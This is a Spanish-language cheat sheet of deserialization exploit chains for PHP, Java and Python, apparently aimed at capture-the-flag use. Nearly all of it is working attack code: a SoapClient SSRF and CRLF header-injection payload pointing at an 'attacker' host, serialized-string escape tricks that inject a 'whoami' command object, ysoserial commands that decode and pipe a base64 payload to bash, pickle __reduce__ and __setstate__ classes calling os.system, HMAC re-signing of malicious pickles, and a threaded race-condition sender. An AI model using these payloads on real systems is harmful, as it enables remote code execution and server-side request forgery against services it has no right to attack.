# Manual de cadenas de explotación de deserialización

## Deserialización PHP

### Conceptos básicos
```php
// Serialización
$s = serialize($obj);  // O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"super";}

// Deserialización
$obj = unserialize($s);

// Cadena de disparo de métodos mágicos
__construct() → __wakeup() → __destruct()
__toString() → __call() → __get()
```

### Cadenas de explotación comunes

#### 1. Bypass de __wakeup (CVE-2017-12944 / PHP < 7.4)
```php
// Cuando el número de propiedades declarado es mayor que el real, __wakeup no se ejecuta
O:4:"User":2:{...}   // Normal
O:4:"User":3:{...}   // Bypass de __wakeup (número de propiedades 3 > real 2)
```

#### 2. Disparo de __toString
```php
class FileViewer {
    public $filename;
    function __toString() {
        return file_get_contents($this->filename);
    }
}
// Construcción: O:10:"FileViewer":1:{s:8:"filename";s:8:"flag.php";}
```

#### 3. Inyección CRLF en SoapClient (SSRF)
```php
$target = "http://internal-service/";
$client = new SoapClient(null, array(
    'uri' => "http://attacker/",
    'location' => $target,
    'user_agent' => "Attacker\r\nX-Forwarded-For: 127.0.0.1\r\nCookie: session=admin",
));
// Al serializar se dispara SSRF + inyección de cabeceras CRLF
echo urlencode(serialize($client));
```

#### 4. Manipulación de longitud en la serialización PHP
```
// Aprovecha la diferencia de longitud al modificar cadenas
// s:5:"admin" (5 bytes) vs s:5:"admin" (la longitud puede quedar inconsistente tras la modificación)
// Cambiar el valor de longitud de la cadena serializada permite truncar o inyectar datos
```

### Escape de cadenas en la deserialización PHP

**Escape por incremento** (la cadena crece tras el filtrado):
```
// Filtro: "x" → "xx" (1→2, +1 byte por cada ocurrencia)
// Inyección: rellenar la propiedad controlable con ";}O:4:"Evil":1:{s:4:"cmd";s:6:"whoami";}
// Calcular cuántas "x" se necesitan para compensar la diferencia de longitud
```

**Escape por reducción** (la cadena se acorta tras el filtrado):
```
// Filtro: "xx" → "x" (2→1, -1 byte por cada ocurrencia)
// Aprovecha la reducción de longitud para "engullir" la cadena serializada siguiente
```

## Deserialización Java

### Gadgets comunes

| Cadena de gadgets | Componente afectado | Ejecución de comandos |
|-----------|---------|---------|
| CommonsCollections1-7 | Apache Commons Collections | Runtime.exec() |
| CommonsBeanutils1 | Commons Beanutils | TemplatesImpl |
| Spring1 | Spring Framework | JdkDynamicProxy |
| Groovy1 | Groovy | MethodClosure |
| JBossInvoker | JBoss | InvokerTransformer |
| ROME | ROME | ObjectInstantiator |

### Métodos de detección
```
# Revisar puertos/rutas comunes
/invoker/readonly
/jmx-console/
/web-console/
/jbossws/
```

### Payloads habituales de ysoserial
```bash
java -jar ysoserial.jar CommonsCollections5 "cmd" > payload.bin
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" > payload.bin
```

## Deserialización Python

### RCE por deserialización con pickle
```python
import pickle
import os

class Evil(object):
    def __reduce__(self):
        return (os.system, ('id',))

payload = pickle.dumps(Evil())
# Enviar el payload al objetivo
```

### Bypass de firma
```python
# Si el objetivo usa firma HMAC
# 1. Obtener la clave de firma (posiblemente mediante una fuga de información)
# 2. Construir un pickle malicioso y volver a firmarlo
import hmac, hashlib
secret = b'secret_key'
payload = pickle.dumps(Evil())
signature = hmac.new(secret, payload, hashlib.sha256).hexdigest()
```

### Alternativa a __reduce__
```python
# Usar __setstate__
class Evil:
    def __setstate__(self, state):
        os.system('id')
```

## Explotación de condiciones de carrera

```python
import requests
import threading

def exploit():
    # En la ventana de tiempo entre la deserialización y la validación
    r = requests.post(url, data=payload)
    
# Envío concurrente
threads = [threading.Thread(target=exploit) for _ in range(50)]
for t in threads:
    t.start()
for t in threads:
    t.join()
```
